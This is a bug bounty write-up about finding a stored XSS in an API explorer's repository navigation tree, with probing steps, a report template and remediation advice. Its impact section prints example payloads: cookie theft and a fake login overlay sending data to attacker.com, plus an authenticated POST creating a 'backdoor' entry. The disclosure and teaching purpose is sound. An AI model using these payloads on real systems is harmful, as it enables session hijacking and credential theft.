# I Found a Stored XSS in an API Explorer — Here’s Exactly How I Did It

- **Source URL:** https://medium.com/@sadananddevre/i-found-a-stored-xss-in-an-api-explorer-heres-exactly-how-i-did-it-2096dfc94753?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@sadananddevre
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 13392)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### Sometimes the juiciest bugs hide in the tools developers use to test their own APIs.

### The Target No One Was Looking At

Every bug hunter knows the feeling. You’ve been staring at the main application for hours. Login forms, search bars, profile fields — all hardened, all sanitized. You’re about to call it a night.

Then you stumble into a corner of the application that feels… different. Less polished. Like it was built for internal use and quietly exposed to the world.

That’s exactly where I found this one.

The target was a **WSG (Web Services Gateway) Explorer** — essentially a built-in API testing interface sitting on the server at WsgExplorer.aspx. Think of it like a Swagger UI or Postman-in-a-browser. It had a navigation tree, a query builder, and options to create and modify data. Developers use tools like this to explore and test API endpoints directly.

It was clearly not the main attraction. And that’s precisely why nobody had looked closely at it.

### First Look at the Interface

The explorer exposed several API resource categories in its navigation tree:

- ConnectionFormats
- MetaSchema
- Plugins
- Policies
- **Repositories** ← this caught my eye
- ServiceVersions

The interface allowed users to query these resources, generate test collections, and modify/upload data. Functionality like this almost always involves user-controlled input being reflected somewhere — and where there’s reflection, there’s potential for XSS.

I started with the **Repositories** node since it appeared to accept user-defined names and metadata. The question was: did the application sanitize what it stored and rendered back?

### Finding the Injection Point

I began by testing simple inputs across every field I could interact with. My methodology was straightforward:

**Step 1 — Probe with a benign string**

test\_sadanand\_123

Submitted it, refreshed the navigation tree, confirmed it reflected back. The input was being stored and rendered in the DOM.

**Step 2 — Test for HTML injection**

\<b>test\</b>

Rendered as bold text in the UI. No encoding. The application was injecting raw HTML into the page. This meant the browser was interpreting my input as markup, not as plain text.

**Step 3 — Escalate to script execution**

`<img src=x onerror="alert('Hacked by Sadanand')">`
I submitted the payload and navigated back to the tree node.

The browser fired the alert immediately.

### Proof of Concept

The alert executed in the context of the application’s origin. The payload was stored in the backend and rendered every time the tree node loaded — making this a **Stored (Persistent) XSS**, not just a reflected one.

You can also see in the page source that the injected payload was embedded directly into the DOM:

id="\_3c\_img\_20\_src\_3d\_\_22\_x\_22\_\_20\_onerror\_3d\_\_22\_alert\_28\_\_27\_Hacked\_20\_by\_20\_Sadanand\_27\_...

The application attempted to encode the id attribute but **failed to encode the actual rendered HTML content** — a classic partial-sanitization mistake. The content still executed as JavaScript.

### Why Stored XSS Is Worse Than Reflected

A lot of beginners treat all XSS the same. They’re not.

Type Persists? Requires victim to click a link? Impact Reflected XSS ❌ ✅ Yes Medium DOM XSS ❌ ✅ Yes Medium **Stored XSS** ✅ **Yes** ❌ **No High / Critical**

With **Stored XSS**, the payload lives in the database. Every user who loads that page — admin, developer, support agent — triggers the script automatically. No phishing link. No social engineering. The attack is already waiting for them.

In an API explorer like this one, the likely victims are **developers and administrators** — the exact people with the highest privileges in the system.

### What an Attacker Could Do With This

A real attacker wouldn’t stop at alert('XSS'). That's just proof the door is open. Here's what comes next:

### Session Cookie Theft

`fetch('https://attacker.com/steal?c=' + document.cookie)`
If cookies lack the HttpOnly flag, the attacker silently grabs the admin's session and logs in as them.

### Credential Harvesting

// Inject a fake login overlay

document.body.innerHTML = '\<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">\<h2>Session expired. Please log in again.\</h2>\<input id="u" placeholder="Username">\<input id="p" type="password" placeholder="Password">\<button onclick="fetch(\'https://attacker.com/creds?u=\'+u.value+\'&p=\'+p.value)">Login\</button>\</div>'

### Internal API Abuse

Since the XSS runs in the application’s origin, it can make authenticated API calls on behalf of the logged-in user:

// Create a malicious repository entry

fetch('/wsg/v2.8/Repositories', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({name: 'backdoor', config: '...'})

})

### Worm-Like Propagation

In an API explorer, if the injected node is visible to all users viewing the tree, the XSS executes for every one of them — multiplying impact without any additional attacker effort.

### The Root Cause

The vulnerability existed because the application did two things wrong simultaneously:

**1. Stored unsanitized input**

User-supplied strings were saved to the backend without stripping HTML tags or encoding special characters like \<, >, and ".

**2. Rendered stored data as raw HTML**

When building the navigation tree, the frontend injected stored values directly into innerHTML (or equivalent) without escaping them first.

The fix requires **both**:

- Server-side: sanitize or reject HTML tags on input
- Client-side: use textContent instead of innerHTML, or escape output before rendering

Fixing only one side still leaves a gap.

### My Bug Report (Template You Can Use)

**Title:** Stored XSS in WsgExplorer Navigation Tree via Unsanitized Repository Names

**Severity:** High

**Affected Endpoint:** [https://\[target\]/wsg/Pages/WsgExplorer.aspx](https://[target]/wsg/Pages/WsgExplorer.aspx)

**Steps to Reproduce:**

1. Navigate to the WsgExplorer interface
2. Go to Navigation Tree → Repositories
3. Create a new repository with the name:

`<img src=x onerror="alert('XSS')">`
4\. Save and refresh the navigation tree

5. Observe JavaScript execution

**Proof of Concept:** *(attached screenshots)*

**Impact:** Stored XSS executing in the context of the application’s origin. Any user (including admins) who loads the navigation tree will trigger the payload. This can be escalated to session hijacking, credential theft, or unauthorized API actions.

**Remediation:** Sanitize user input on storage; encode output before rendering in the DOM.

### Key Takeaways for Bug Hunters

**1. Target developer-facing tools.** Admin panels, API explorers, and internal dashboards are often less hardened than the main application. Developers build them quickly and trust them implicitly.

**2. Test every input that reflects back.** If you see your text appear anywhere on the page, probe it. Start with \<b>, escalate to \<img onerror>.

**3. Stored XSS > Reflected XSS every time.** Always try to store your payload, not just reflect it. Stored payloads hit every future visitor automatically.

**4. Partial sanitization is not sanitization.** The application here encoded the id attribute but not the content. Look for inconsistencies in how different parts of your input are handled.

**5. A simple alert() is enough for the report.** You don't need to build a full exploit chain to prove impact. Show execution, describe the worst-case scenario, let the security team connect the dots.
